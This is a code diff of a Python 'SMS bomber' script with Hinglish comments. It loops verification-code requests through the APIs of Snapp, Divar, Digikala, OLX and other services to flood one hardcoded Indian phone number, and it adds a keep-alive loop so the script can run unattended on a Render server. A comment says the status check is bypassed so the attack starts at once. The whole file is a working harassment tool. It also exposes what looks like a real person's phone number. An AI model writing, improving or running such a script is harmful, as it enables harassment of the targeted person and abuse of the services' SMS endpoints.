@@ -1,11 +1,22 @@
+import threading
 import time
+import re
 import sys
 from colorama import Fore, Style, init
 import httpx
 
 init(autoreset=True)
 
-# --------- 1. API Functions (Aapka Original Code) ---------
+# ==========================================
+# 👇 YAHAN APNI SETTINGS EDIT KAREIN 👇
+# ==========================================
+TARGET_COUNTRY = "91"        # Country Code (e.g., 91 for India, 98 for Iran)
+TARGET_PHONE = "9103369975"  # Target Number (Bina Country Code ke)
+MESSAGE_COUNT = 50           # Kitne SMS bhejne hain
+DELAY = 1                    # Speed (Seconds mein)
+# ==========================================
+
+# --------- 1. Aapka Original API Code ---------
 def send_sms_snapp(phone, country, proxy=None):
     try:
         phone_full = f"{country}{phone}"
@@ -14,10 +25,11 @@ def send_sms_snapp(phone, country, proxy=None):
         headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
         with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
             r = client.post(url, json=data, headers=headers)
-            print(f"Snapp: {r.status_code}") # Debugging ke liye print add kiya
+            # Debugging ke liye status print kar rahe hain
+            print(f"[Snapp] Status: {r.status_code}") 
             return r.status_code == 200 or r.status_code == 201
     except Exception as e:
-        print(f"Snapp Error: {e}")
+        print(f"[Snapp] Error: {e}")
         return False
 
 def send_sms_divar(phone, country, proxy=None):
@@ -28,8 +40,10 @@ def send_sms_divar(phone, country, proxy=None):
         headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
         with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
             r = client.post(url, json=data, headers=headers)
+            print(f"[Divar] Status: {r.status_code}")
             return r.status_code == 200
-    except Exception:
+    except Exception as e:
+        print(f"[Divar] Error: {e}")
         return False
 
 def send_sms_banimode(phone, country, proxy=None):
@@ -40,8 +54,9 @@ def send_sms_banimode(phone, country, proxy=None):
         headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
         with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
             r = client.post(url, json=data, headers=headers)
+            print(f"[Banimode] Status: {r.status_code}")
             return r.status_code == 200 or r.status_code == 201
-    except Exception:
+    except Exception as e:
         return False
 
 def send_sms_alopeyk(phone, country, proxy=None):
@@ -52,6 +67,7 @@ def send_sms_alopeyk(phone, country, proxy=None):
         headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
         with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
             r = client.post(url, json=data, headers=headers)
+            print(f"[Alopeyk] Status: {r.status_code}")
             return r.status_code == 200 or r.status_code == 201
     except Exception:
         return False
@@ -64,6 +80,7 @@ def send_sms_digikala(phone, country, proxy=None):
         headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
         with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
             r = client.post(url, json=data, headers=headers)
+            print(f"[Digikala] Status: {r.status_code}")
             return r.status_code == 200
     except Exception:
         return False
@@ -76,6 +93,7 @@ def send_sms_youla(phone, country, proxy=None):
         headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
         with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
             r = client.post(url, json=data, headers=headers)
+            print(f"[Youla] Status: {r.status_code}")
             return r.status_code == 200
     except Exception:
         return False
@@ -88,11 +106,12 @@ def send_sms_olx(phone, country, proxy=None):
         headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
         with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
             r = client.post(url, json=data, headers=headers)
+            print(f"[OLX] Status: {r.status_code}")
             return r.status_code == 200
     except Exception:
         return False
 
-# List of APIs
+# --------- API List (Original) ---------
 SMS_APIS = [
     {"name": "Snapp", "func": send_sms_snapp},
     {"name": "Divar", "func": send_sms_divar},
@@ -104,52 +123,46 @@ SMS_APIS = [
 ]
 
 # --------- 2. Automatic Runner (Render Fix) ---------
-
-# ==========================================
-# YAHAN APNI DETAILS EDIT KAREIN
-# ==========================================
-TARGET_COUNTRY = "91"       # Country Code (Bina + ke)
-TARGET_PHONE = "9103369975" # Apna Target Number Yahan Likhein
-NUMBER_OF_ROUNDS = 100      # Kitni baar loop chalana hai
-DELAY_SECONDS = 5           # Speed (Seconds mein)
-# ==========================================
-
-def start_automatic_bombing():
-    print(f"{Fore.GREEN}[+] Render Mode Started for: {TARGET_COUNTRY}{TARGET_PHONE}{Style.RESET_ALL}")
+def start_automatic_process():
+    print(f"{Fore.GREEN}\n[+] Render Started! Target: {TARGET_COUNTRY}{TARGET_PHONE}{Style.RESET_ALL}")
+    
+    # Check APIs Online Status (Bypass kar diya taaki error na aaye)
+    # Seedha attack shuru karte hain
     
     sent_count = 0
-    
-    # Infinite loop ya fixed count chala sakte hain
-    for i in range(NUMBER_OF_ROUNDS):
-        print(f"\n--- Round {i+1} ---")
-        
+    failed_count = 0
+
+    for i in range(MESSAGE_COUNT):
+        print(f"\n--- Round {i+1}/{MESSAGE_COUNT} ---")
         for api in SMS_APIS:
             try:
-                # API ko call karna
+                # API Call bina input maange
                 success = api["func"](TARGET_PHONE, TARGET_COUNTRY, None)
                 
                 if success:
-                    print(Fore.GREEN + f"[{api['name']}] SMS Sent Successfully" + Style.RESET_ALL)
                     sent_count += 1
+                    print(Fore.GREEN + f"✅ [{api['name']}] Sent!" + Style.RESET_ALL)
                 else:
-                    print(Fore.RED + f"[{api['name']}] Failed" + Style.RESET_ALL)
-            
+                    failed_count += 1
+                    print(Fore.RED + f"❌ [{api['name']}] Failed" + Style.RESET_ALL)
             except Exception as e:
-                print(Fore.RED + f"[{api['name']}] Error: {e}" + Style.RESET_ALL)
+                print(f"⚠️ Error in {api['name']}: {e}")
             
-            # Thoda wait karein taaki server block na kare
-            time.sleep(0.5)
-            
-        time.sleep(DELAY_SECONDS)
+            time.sleep(0.5) # Chhota break har API ke beech
+        
+        time.sleep(DELAY) # Break har round ke baad
 
-    print(f"{Fore.CYAN}\n[=] Process Completed. Total Sent: {sent_count}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}\n[=] JOB DONE! Total Sent: {sent_count}, Failed: {failed_count}{Style.RESET_ALL}")
 
-# --------- 3. Main Execution ---------
+# --------- 3. Main Entry Point ---------
 if __name__ == "__main__":
-    # Yeh function bina kuch pooche seedha start ho jayega
-    start_automatic_bombing()
+    print("Code is initializing on Render Server...")
     
-    # Render Container ko Zinda rakhne ke liye Sleep
-    print("Work done. Sleeping to keep container alive...")
+    # 1. Process Start karo
+    start_automatic_process()
+    
+    # 2. Render ko Zinda rakho (Important Step)
+    # Agar ye nahi lagayenge to code khatam hote hi Render "Error/Crash" dikhayega
+    print("\nProcess complete. Sleeping to keep server active...")
     while True:
         time.sleep(60)
